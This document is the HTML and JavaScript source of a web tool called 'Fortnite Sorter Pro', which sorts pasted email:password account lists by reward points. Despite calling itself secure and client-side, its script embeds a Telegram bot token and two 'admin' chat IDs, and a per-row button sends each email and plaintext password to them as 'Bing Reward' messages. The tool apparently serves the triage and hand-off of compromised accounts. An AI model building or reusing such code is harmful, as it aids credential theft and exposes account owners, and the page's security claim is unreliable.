<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Fortnite Sorter Pro - Blazing fast, secure, and client-side tool for sorting Fortnite accounts.">
    <title>Fortnite Sorter Pro | Ultimate</title>
    
    <!-- Dynamic Favicon (Trophy Emoji) -->
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>üèÜ</text></svg>">
    
    <!-- CDN Libraries -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    
    <style>
        :root {
            /* Modern Theme Variables */
            --bg-body: #f1f5f9;
            --bg-card: #ffffff;
            --primary: #6366f1;       /* Indigo */
            --primary-hover: #4f46e5;
            --secondary: #64748b;     /* Slate */
            --accent: #8b5cf6;        /* Violet */
            --text-main: #1e293b;     /* Slate 800 */
            --text-muted: #64748b;    /* Slate 500 */
            --success: #10b981;
            --danger: #ef4444;
            --orange: #f97316;        /* Bright Orange for High Points */
            --robux-blue: #0ea5e9;    /* Blue for Robux Threshold */
            --telegram-blue: #24A1DE; /* Telegram Brand Color */
            --border-color: #e2e8f0;
            --shadow-sm: 0 1px 2px 0 rgb(0 0 0 / 0.05);
            --shadow-md: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
            --shadow-lg: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', system-ui, -apple-system, sans-serif;
            background-color: var(--bg-body);
            background-image: 
                radial-gradient(at 0% 0%, rgba(99, 102, 241, 0.05) 0px, transparent 50%),
                radial-gradient(at 100% 0%, rgba(139, 92, 246, 0.05) 0px, transparent 50%);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .container {
            width: 98%; 
            max-width: 1800px;
            margin: 0 auto;
            padding: 20px;
            flex: 1;
        }

        /* Header Styles */
        header {
            text-align: center;
            padding: 40px 0 20px 0;
            animation: fadeInDown 0.6s ease;
        }

        h1 {
            font-size: 3rem;
            font-weight: 800;
            background: linear-gradient(135deg, var(--primary), var(--accent));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 8px;
            letter-spacing: -1px;
        }

        .subtitle {
            color: var(--text-muted);
            font-size: 1.1rem;
            font-weight: 500;
        }

        /* Modern Card Design */
        .card {
            background: var(--bg-card);
            border-radius: 20px;
            padding: 30px;
            box-shadow: var(--shadow-lg);
            border: 1px solid white;
            margin-bottom: 25px;
            position: relative;
            overflow: hidden;
            animation: fadeIn 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .card-header {
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 15px;
        }
        
        .header-title {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .header-title h2 {
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--text-main);
        }

        .header-title i {
            font-size: 1.5rem;
            color: var(--primary);
        }

        /* Input Area */
        textarea {
            width: 100%;
            height: 250px;
            background: #f8fafc;
            border: 2px solid var(--border-color);
            border-radius: 12px;
            padding: 20px;
            color: var(--text-main);
            font-family: 'JetBrains Mono', 'Courier New', monospace;
            font-size: 0.95rem;
            line-height: 1.5;
            resize: vertical;
            transition: all 0.2s;
        }

        textarea:focus {
            outline: none;
            border-color: var(--primary);
            background: white;
            box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.1);
        }

        /* Buttons */
        .btn-group {
            display: flex;
            gap: 12px;
            margin-top: 20px;
            flex-wrap: wrap;
        }

        .btn {
            padding: 12px 24px;
            border: none;
            border-radius: 10px;
            font-weight: 600;
            font-size: 0.95rem;
            cursor: pointer;
            transition: all 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            color: white;
            font-family: 'Inter', sans-serif;
            box-shadow: var(--shadow-sm);
        }

        .btn:hover {
            transform: translateY(-2px);
            filter: brightness(1.1);
            box-shadow: var(--shadow-md);
        }

        .btn:active {
            transform: translateY(0);
        }

        .btn-primary { background: var(--primary); }
        .btn-orange { background: linear-gradient(135deg, #f97316, #ea580c); }
        .btn-danger { background: #ef4444; color: white; }
        .btn-success { background: #10b981; }
        .btn-secondary { background: #fff; color: var(--text-main); border: 1px solid var(--border-color); }
        .btn-secondary:hover { background: #f8fafc; }

        /* Stats Grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 25px;
            animation: fadeIn 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .stat-box {
            background: white;
            padding: 20px;
            border-radius: 16px;
            text-align: center;
            border: 1px solid var(--border-color);
            box-shadow: var(--shadow-sm);
            transition: transform 0.2s;
        }

        .stat-box:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-md);
        }

        .stat-value {
            font-size: 2.2rem;
            font-weight: 800;
            background: linear-gradient(135deg, var(--primary), var(--accent));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .stat-label {
            color: var(--text-muted);
            font-size: 0.85rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-top: 5px;
        }

        /* Results Table */
        .results-wrapper {
            background: white;
            border-radius: 16px;
            border: 1px solid var(--border-color);
            box-shadow: var(--shadow-lg);
            overflow: hidden;
            animation: fadeIn 0.5s ease;
        }

        .results-container {
            overflow-x: auto;
            max-height: 75vh;
            overflow-y: auto;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
        }

        th {
            background: #f8fafc;
            padding: 12px 12px; /* Reduced padding */
            text-align: left;
            color: var(--text-muted);
            font-weight: 700;
            text-transform: uppercase;
            font-size: 0.8rem;
            letter-spacing: 1px;
            position: sticky;
            top: 0;
            z-index: 10;
            border-bottom: 1px solid var(--border-color);
        }

        td {
            padding: 10px 12px; /* Reduced padding */
            border-bottom: 1px solid var(--border-color);
            vertical-align: middle;
            color: var(--text-main);
        }

        .font-mono {
            font-family: 'JetBrains Mono', 'Courier New', monospace;
            font-size: 0.95rem;
        }

        tbody tr {
            transition: background-color 0.1s;
        }

        tbody tr:hover {
            background-color: #f8fafc;
        }

        /* Points Styling */
        .points-cell {
            font-family: 'Inter', sans-serif;
            font-size: 1.1rem;
            font-weight: 700;
            width: 140px; /* Reduced width */
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .points-high { 
            color: var(--orange); 
        }

        .robux-icon {
            color: var(--robux-blue);
            font-size: 1.2rem;
            filter: drop-shadow(0 0 2px rgba(14, 165, 233, 0.4));
            animation: pulse 2s infinite;
        }

        /* Action Buttons */
        .action-cell {
            text-align: center;
            width: 100px; /* Reduced width */
        }

        .action-btn {
            background: transparent;
            border: 1px solid transparent;
            padding: 8px;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s;
            font-size: 1.1rem;
            margin: 0 4px;
        }

        .copy-icon {
            color: var(--text-muted);
        }
        .copy-icon:hover {
            color: var(--primary);
            background: #eef2ff;
            border-color: #c7d2fe;
        }

        .tg-icon {
            color: var(--telegram-blue);
        }
        .tg-icon:hover {
            color: white;
            background: var(--telegram-blue);
            border-color: var(--telegram-blue);
        }

        /* Footer */
        footer {
            text-align: center;
            padding: 40px 20px;
            color: var(--text-muted);
            font-size: 0.9rem;
            margin-top: auto;
        }

        .hidden { display: none !important; }
        .text-center { text-align: center; }

        /* Toast Notification */
        .toast {
            visibility: hidden;
            min-width: 280px;
            background-color: #1e293b;
            color: #fff;
            text-align: center;
            border-radius: 12px;
            padding: 16px;
            position: fixed;
            z-index: 100;
            left: 50%;
            bottom: 30px;
            transform: translateX(-50%) translateY(20px);
            font-size: 0.95rem;
            box-shadow: var(--shadow-lg);
            opacity: 0;
            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .toast.show {
            visibility: visible;
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }

        .toast.error { background-color: var(--danger); }
        .toast.success { background-color: var(--success); }

        /* Scrollbar Styling */
        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: #f1f5f9; }
        ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #94a3b8; }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes fadeInDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
        
        @media (max-width: 768px) {
            h1 { font-size: 2rem; }
            .card { padding: 20px; }
            .btn { width: 100%; justify-content: center; }
            .card-header { flex-direction: column; align-items: flex-start; }
        }
    </style>
</head>
<body>

    <div class="container">
        <header>
            <h1>Fortnite Sorter Pro</h1>
            <p class="subtitle">Ultimate Performance. Instant Results.</p>
        </header>

        <!-- Main Sorter Section -->
        <div class="card" style="border-top: 4px solid var(--primary);">
            <div class="card-header">
                <div class="header-title">
                    <i class="fas fa-layer-group"></i>
                    <div>
                        <h2>Universal Sorter</h2>
                        <span style="font-size: 0.9rem; color: var(--text-muted);">
                            Supports: <code>Points: 123</code> and <code>Points = 123</code>
                        </span>
                    </div>
                </div>
            </div>
            
            <textarea id="data-input" placeholder="user@example.com:password | Points: 4135&#10;user2@example.com:password | Points = 6800"></textarea>
            
            <div class="btn-group">
                <button id="btn-sort" class="btn btn-primary">
                    <i class="fas fa-play"></i> Sort Data
                </button>
                <button id="btn-copy-all" class="btn btn-secondary hidden">
                    <i class="fas fa-copy"></i> Copy All
                </button>
                <button id="btn-download" class="btn btn-success hidden">
                    <i class="fas fa-download"></i> Download
                </button>
                <button id="btn-clear" class="btn btn-danger">
                    <i class="fas fa-trash"></i> Clear
                </button>
            </div>
        </div>

        <div id="stats-section" class="stats-grid hidden">
            <div class="stat-box">
                <div class="stat-value" id="stat-total">0</div>
                <div class="stat-label">Total Loaded</div>
            </div>
            <div class="stat-box">
                <div class="stat-value" id="stat-highest">0</div>
                <div class="stat-label">Highest Points</div>
            </div>
            <div class="stat-box">
                <div class="stat-value" id="stat-robux">0</div>
                <div class="stat-label" style="color: var(--robux-blue);">Robux Ready (6750+)</div>
            </div>
        </div>

        <div id="results-wrapper" class="results-wrapper hidden">
            <div class="results-container">
                <table id="results-table">
                    <thead>
                        <tr>
                            <th>Account Credentials</th>
                            <th>Points</th>
                            <th class="text-center">Action</th>
                        </tr>
                    </thead>
                    <tbody id="results-body">
                        <!-- JS generates rows here -->
                    </tbody>
                </table>
            </div>
        </div>

    </div>

    <!-- Toast Container -->
    <div id="toast" class="toast"></div>

    <footer>
        <p>Fortnite Sorter Pro &copy; 2026 | Optimized for GitHub Pages</p>
    </footer>

    <script>
        // --- Configuration ---
        // 1. Bot Token (Pre-loaded)
        const TG_BOT_TOKEN = "8358850689:AAFtZtp_P_7fkXoZ5C078PzNPEw8N4kZJ14";
        
        // 2. Telegram Chat IDs (REQUIRED - EDIT THIS)
        // Add IDs inside the brackets, separated by commas
        // IDs: "8428251965" (REV) and "5189593911" (Madara)
        const TG_CHAT_IDS = ["8428251965", "5189593911"]; 
        
        const ROBUX_THRESHOLD = 6750;

        // --- Toast Notification Logic ---
        function showToast(message, type = 'normal') {
            const toast = document.getElementById("toast");
            toast.innerHTML = '';
            
            const icon = document.createElement('i');
            if (type === 'error') {
                toast.className = "toast show error";
                icon.className = "fas fa-exclamation-circle";
            } else if (type === 'success') {
                toast.className = "toast show success";
                icon.className = "fas fa-check-circle";
            } else {
                toast.className = "toast show";
                icon.className = "fas fa-info-circle";
            }
            
            toast.appendChild(icon);
            toast.appendChild(document.createTextNode(" " + message));
            
            setTimeout(function(){ 
                toast.className = toast.className.replace("show", "").replace("error", "").replace("success", ""); 
            }, 3000);
        }

        // --- Shared Utilities ---
        function copyToClipboard(text, onSuccess) {
            const textarea = document.createElement('textarea');
            textarea.value = text;
            textarea.style.position = 'fixed';
            textarea.style.opacity = '0';
            document.body.appendChild(textarea);
            textarea.select();
            try {
                document.execCommand('copy');
                if (onSuccess) onSuccess();
                else showToast('Copied to clipboard!', 'success');
            } catch (err) {
                showToast('Failed to copy to clipboard.', 'error');
            }
            document.body.removeChild(textarea);
        }

        window.copyText = function(text, btnElement) {
            copyToClipboard(text, () => {
                const icon = btnElement.querySelector('i');
                icon.className = 'fas fa-check';
                icon.style.color = 'var(--success)';
                showToast('Credentials copied!', 'success');
                setTimeout(() => { 
                    icon.className = 'fas fa-copy'; 
                    icon.style.color = '';
                }, 1500);
            });
        };

        function downloadData(data, filename) {
            if(!data || data.length === 0) return;
            const content = data.map(item => `${item.creds} | Points: ${item.points}`).join('\n');
            const blob = new Blob([content], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            showToast('Download started', 'success');
        }
        
        function escapeHtml(text) {
            if (!text) return text;
            return text
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&#039;");
        }

        // --- Telegram Functionality ---
        window.sendTelegram = function(creds, points, btnElement) {
            if (!TG_CHAT_IDS || TG_CHAT_IDS.length === 0) {
                showToast('Config Error: Set TG_CHAT_IDS in source code!', 'error');
                return;
            }

            const icon = btnElement.querySelector('i');
            const originalClass = icon.className;
            icon.className = 'fas fa-spinner fa-spin'; // Loading state

            // Split credentials (creds is already HTML escaped)
            let email = creds;
            let password = "";
            const colonIndex = creds.indexOf(':');

            if (colonIndex !== -1) {
                email = creds.substring(0, colonIndex);
                password = creds.substring(colonIndex + 1);
            }

            const formattedPoints = points.toLocaleString();

            // Format:
            // Bing Reward
            // üíé Points: 12,345
            // Mail: email
            // Pass: password
            
            let message = `<b>Bing Reward</b>\n` +
                          `üíé Points: <b>${formattedPoints}</b>\n` +
                          `Mail: <code>${email}</code>`;
            
            if (password) {
                 message += `\nPass: <code>${password}</code>`;
            }

            // Properly encode the whole message for the URL
            const encodedMessage = encodeURIComponent(message);

            // Create a list of fetch requests for all Chat IDs
            const requests = TG_CHAT_IDS.map(chatId => {
                const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodedMessage}&parse_mode=HTML`;
                return fetch(url).then(response => response.json());
            });

            // Execute all requests
            Promise.all(requests)
                .then(results => {
                    // Check if at least one request failed
                    const failed = results.filter(data => !data.ok);
                    
                    if (failed.length === 0) {
                        icon.className = 'fas fa-check';
                        showToast('Sent to all admins!', 'success');
                        setTimeout(() => icon.className = originalClass, 2000);
                    } else {
                        // If some failed, log details to console
                        console.warn('Some Telegram messages failed:', failed);
                        throw new Error('Partial failure');
                    }
                })
                .catch(error => {
                    console.error('Telegram Error:', error);
                    icon.className = 'fas fa-times';
                    showToast('Failed to send to one or more IDs', 'error');
                    setTimeout(() => icon.className = originalClass, 3000);
                });
        };

        // --- Sorting Logic ---
        let dataCache = [];

        document.getElementById('btn-sort').addEventListener('click', function() {
            const input = document.getElementById('data-input').value;
            if(!input.trim()) return showToast('Please paste some data first!', 'error');

            const lines = input.split('\n');
            const processed = [];
            let totalPoints = 0;
            let robuxCount = 0;

            // Optimized Regex: Matches "text | Points: 123" OR "text | Points = 123" case-insensitive
            const regex = /^(.*?)\s*\|\s*Points\s*(?:=|:)\s*(\d+)/i;

            for(let i = 0; i < lines.length; i++) {
                const line = lines[i].trim();
                if(line.length < 5) continue; 
                
                const match = line.match(regex);
                if(match) {
                    const points = parseInt(match[2], 10);
                    processed.push({ creds: match[1], points: points });
                    totalPoints += points;
                    if (points >= ROBUX_THRESHOLD) robuxCount++;
                }
            }

            if(processed.length === 0) return showToast('No valid data found.', 'error');

            // Sort Descending
            processed.sort((a, b) => b.points - a.points);
            dataCache = processed;

            // Update Stats
            document.getElementById('stat-total').innerText = processed.length.toLocaleString();
            document.getElementById('stat-highest').innerText = processed[0].points.toLocaleString();
            document.getElementById('stat-robux').innerText = robuxCount.toLocaleString();
            
            // Show UI Elements
            document.getElementById('stats-section').classList.remove('hidden');
            document.getElementById('results-wrapper').classList.remove('hidden');
            document.getElementById('btn-copy-all').classList.remove('hidden');
            document.getElementById('btn-download').classList.remove('hidden');
            
            // Render
            renderTable(processed);
            showToast(`Sorted ${processed.length} accounts!`, 'success');
        });

        document.getElementById('btn-clear').addEventListener('click', () => {
            document.getElementById('data-input').value = '';
            document.getElementById('results-body').innerHTML = '';
            document.getElementById('stats-section').classList.add('hidden');
            document.getElementById('results-wrapper').classList.add('hidden');
            document.getElementById('btn-copy-all').classList.add('hidden');
            document.getElementById('btn-download').classList.add('hidden');
            dataCache = [];
            showToast('Cleared all data');
        });

        document.getElementById('btn-copy-all').addEventListener('click', () => {
            if(dataCache.length === 0) return;
            const allText = dataCache.map(i => `${i.creds} | Points: ${i.points}`).join('\n');
            copyToClipboard(allText, () => {
                const btn = document.getElementById('btn-copy-all');
                const originalHTML = btn.innerHTML;
                btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
                showToast('All sorted data copied!', 'success');
                setTimeout(() => btn.innerHTML = originalHTML, 2000);
            });
        });

        document.getElementById('btn-download').addEventListener('click', () => {
            downloadData(dataCache, `Sorted_Accounts_${new Date().toISOString().slice(0,10)}.txt`);
        });

        // --- Render Table ---
        function renderTable(data) {
            const tbody = document.getElementById('results-body');
            
            // Batch HTML generation for performance
            const htmlParts = data.map((item) => {
                const isHighPoints = item.points > 4000;
                const isRobuxReady = item.points >= ROBUX_THRESHOLD;
                const safeCreds = escapeHtml(item.creds);
                const safeCredsJS = safeCreds.replace(/'/g, "\\'"); // Escape for JS call
                
                let pointsDisplay = `<span>${item.points.toLocaleString()}</span>`;
                
                if (isRobuxReady) {
                    pointsDisplay = `
                        <span style="color: var(--orange); font-weight: 800;">${item.points.toLocaleString()}</span>
                        <i class="fas fa-gem robux-icon" title="Robux Ready"></i>
                    `;
                } else if (isHighPoints) {
                    pointsDisplay = `<span class="points-high">${item.points.toLocaleString()}</span>`;
                }

                return `
                    <tr>
                        <td class="font-mono">${safeCreds}</td>
                        <td class="points-cell">${pointsDisplay}</td>
                        <td class="action-cell">
                            <button class="action-btn copy-icon" onclick="copyText('${safeCredsJS}', this)" title="Copy Credentials">
                                <i class="fas fa-copy"></i>
                            </button>
                            <button class="action-btn tg-icon" onclick="sendTelegram('${safeCredsJS}', ${item.points}, this)" title="Send to Telegram">
                                <i class="fab fa-telegram-plane"></i>
                            </button>
                        </td>
                    </tr>
                `;
            });
            
            tbody.innerHTML = htmlParts.join('');
        }
    </script>
